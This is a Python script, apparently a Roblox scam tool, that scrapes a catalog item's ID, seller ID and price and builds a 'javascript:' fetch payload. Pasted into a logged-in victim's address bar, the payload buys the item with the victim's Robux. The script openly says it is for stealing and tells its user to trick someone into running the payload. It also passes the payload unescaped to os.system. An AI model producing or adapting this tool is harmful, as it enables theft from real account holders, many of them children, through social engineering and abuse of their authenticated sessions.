import os, requests 

def getProductInfo(product_url):

    html = str(requests.get(product_url).content)

    #Data Product ID Detect
    if 'data-product-id="' in html:
        dataProductID_unindex = int(html.find('data-product-id="')) + 17
        dataProductID_index = dataProductID_unindex
        while 1 == 1:
            dataProductID_index += 1
            if html[dataProductID_index] == "\"":
                break

        dataProductID = str(html[dataProductID_unindex:dataProductID_index])
    else:
        print("Couldn't Find Data Product ID")

    #Seller ID Detect
    if "catalog" in product_url:
        productID1 = product_url.find("catalog")
        productID2 = productID1 + 8

        while 1 == 1:
            productID2 += 1
            if product_url[productID2] == "/":
                break
        productID = product_url[productID1+8:productID2]
    else:
        print("Couldn't Find Product ID")

    #Product Price Detect
    if "text-robux-lg wait-for-i18n-format-render" in html:
        price1 = html.find('text-robux-lg wait-for-i18n-format-render') + 43
        price2 = price1
        while 1 == 1:
            price2 += 1
            if html[price2] == "<":
                break
        
        productPrice = html[price1+1:price2]
        productPrice = productPrice.replace(',', '')
    else:
        print("Couldn't Find Price")
    
    #printing output
    javascript_format = 'xJavascript:fetch("https://economy.roblox.com/v2/user-products/' + str(dataProductID) + '/purchase",{body:JSON.stringify({"expectedCurrency": ' + productPrice + ',"expectedPrice": ' + productPrice + ',"expectedSellerId": ' + str(productID) + '}),method:"POST",credentials:"include",headers:{"Content-Type":"application/json","x-csrf-token":Roblox.XsrfToken.getToken()}})'
    print(f"\n---Output---\n\n{javascript_format}\n")

    #copy to clipboard
    print("---Copy---")
    copyBoolean = input("\n[>] Copy? (y/n)\n[>>>] ")
    if copyBoolean.lower() == "y":
        os.system('echo ' + javascript_format.strip() + '| clip')
        print("[>] Copied!\n")
        print("[>] Tell Someone With Enough Robux To Buy The Product To Put It In Their URL And Remove The \"x\" And Press Enter.\n")
    elif copyBoolean.lower() != "y":
        pass
    print("_________________________________________________________________________________________")

while True:
    print("_________________________________________________________________________________________")
    print("""
    ╔════════════════════════════════════════════════╗
    ║       Made By Dreamer#5114                     ║
    ║       Github: https://github.com/OriginalAlien ║
    ║       Enjoy!                                   ║
    ╚════════════════════════════════════════════════╝
""")
    print("---About---")
    print("\nThis Tool Generates Javascript That When The User Executes It, It Will Buy Them Your Product. You Can Use This To Steal Bobux.\n")
    print("This Doesn't Support Gamepasses But Clothing, Accessories, etc...\n")
    print("---Input---")
    productURL_input = input("\n[>>>] Product URL: ")

    if "roblox" not in productURL_input:
        while "roblox" not in productURL_input:
            print("[>] Enter An Actual Roblox Product Link...")
            productURL_input = input("\n[>>>] Product URL: ")
            if "roblox" in productURL_input:
                getProductInfo(productURL_input)
                break

    elif "roblox" in productURL_input:
        getProductInfo(productURL_input)

#UPDATE: Removed Comma In Prices
